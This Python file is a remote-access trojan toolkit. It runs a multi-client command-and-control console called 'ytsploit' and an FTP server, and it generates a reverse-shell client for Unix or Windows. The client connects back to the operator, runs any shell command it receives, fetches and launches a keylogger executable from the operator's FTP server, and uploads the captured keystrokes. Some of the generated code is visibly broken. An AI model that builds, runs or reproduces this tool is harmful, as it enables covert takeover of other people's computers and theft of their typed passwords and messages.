import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import os
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import base64


NUMBER_OF_THREADS = 3
JOB_NUMBER = [1, 2, 3]
queue = Queue()

COMMANDS = {'help':['Shows this help'],
            'list':['Lists connected clients'],
            'select':['Selects a client by its index. Takes index as a parameter'],
            'quit':['Stops current connection with a client. To be used when client is selected'],
            'back':['Shuts server down'],
            'keylog':['Deploys keylogger'],
            'getkeylog':['Returns the output file from the keylogger']
           }

class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 8080
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_turtle(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input('ytsploit> ')
            if cmd == 'list':
                self.list_connections()
                continue
            elif 'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'back':
                    queue.task_done()
                    queue.task_done()
                    print('Server shutdown')
                    break
                    # self.quit_gracefully()
            elif cmd == 'startftp':
                start_ftp_server()
                
            elif cmd == 'help':
                self.print_help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):
        """ Connect with remote target client 
        :param conn: 
        :param target: 
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
                if cmd == 'keylog':
                    break
                if cmd == 'getkeylog':
                    break
                if cmd == 'ythelp':
                    self.print_help()
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_turtle()
        if x == 3:
            start_ftp_server()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


#if __name__ == '__main__':
    #main()

#Payload Menu Option
    
def payload_create():
    ans21=True
    while ans21:
          print("""
          1. Unix/Mac
          2. Windows
          3. Back
          """)
          ans21 = input("Choose an option ")
          if ans21=="1":
              payload_python()
          elif ans21=="2":
              payload_exe()
          elif ans21=="3":
              main_menu()
          else:
                print("Sorry, not and option...")

# Creates payload for Linux/Mac
def payload_python():
    host = input('Host IP: ')
    print("Creating payload...")
    cwd = os.getcwd()
    payload_path=cwd + '\payload.py'
    f = open(payload_path, "w+")
    f.write(
r"""
import os
import socket
import subprocess
import time
import signal
import sys
import struct
import ftplib

class Client(object):

    def __init__(self):
    """ +
        '    self.serverHost = ' + '"' + host + '"'
    + 
    r"""
        self.serverPort = 8080
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('Quitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
        sys.exit(0)
        return

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str):
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        try:
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server')
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            elif data[:].decode("utf-8") == 'keylog':
                key_logger()
                os.startfile(r'c:\users\public\KeyLogger.exe')
                self.socket.close()
                break
            elif data[:].decode("utf-8") == 'getkeylog':
                get_keylog()
                self.socket.close()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return

def key_logger():
    server = ftplib.FTP()
    """
    "server.connect(" + '"' + host + '", 1026)'
    r"""
    server.login('user','12345')
    #print (server.dir())

    #filename = 'KeyLogger.py'

    server.retrbinary("RETR KeyLogger.exe" ,open(r"c:\users\public\KeyLogger.exe", 'wb').write)
        
def get_keylog():
    os.chdir(r'c:\users\public')
    file2send = 'output.txt'
    server = ftplib.FTP()
    """
    "server.connect(" + '"' + host + '", 1026)'
    r"""
    server.login('anonymous','')
    #print (server.dir())

    file = open('output.txt', 'rb')

    server.storbinary('STOR ' + file2send, file)

def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()

        
""")
    
    f.close()
    print('Payload can be found at ' + payload_path)

def payload_exe():
    print("Creating payload...")
    payload_python()
    cwd = os.getcwd()
    exe_path = cwd + '\dist\payload.exe'
    payload_path=cwd + '\payload.py'
    convert_cmd = 'pyinstaller --onefile ' + payload_path
    os.system(convert_cmd)
    with open(exe_path, "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read())
    mv_cmd = 'move ' + exe_path + ' ' + cwd
    os.system(mv_cmd)
    print('Payload can be found at ' + cwd + '\payload.exe')


def key_log():
    print("Sending Keylogger...")
    start_ftp_server()    

def start_ftp_server():
    ftphost = input("Host IP address: ")
    authorizer = DummyAuthorizer()
    authorizer.add_user("user", "12345", "c:/ftp", perm="elradfmw")
    authorizer.add_anonymous("c:/ftp", perm="elradfmw")

    handler = FTPHandler
    handler.authorizer = authorizer

    server = FTPServer((ftphost, 1026), handler)
    server.serve_forever()


def main_menu():
    ans=True
    while ans:
        print("""
        |||||||||||||  ||||||||||||  |||||||||||||
        |||||||||||||  ||||||||||||  |||||||||||||
            |||||      ||||||        ||||||
            |||||      ||||||        ||||||
            |||||      ||||||||||||  ||||||
            |||||      ||||||||||||  ||||||
            |||||            ||||||  ||||||
            |||||            ||||||  ||||||
            |||||      ||||||||||||  |||||||||||||
            |||||      ||||||||||||  |||||||||||||
        
        1.Console
        2.Payload Creation
        3.Exit/Quit
        """)
        ans = input("What would you like to do? ")
        if ans=="1":
          main()
        elif ans=="2":
          payload_create()
        elif ans=="3":
          print("\n Goodbye") 
          ans = None
        else:
           print("\n Not Valid Choice Try again")

main_menu()
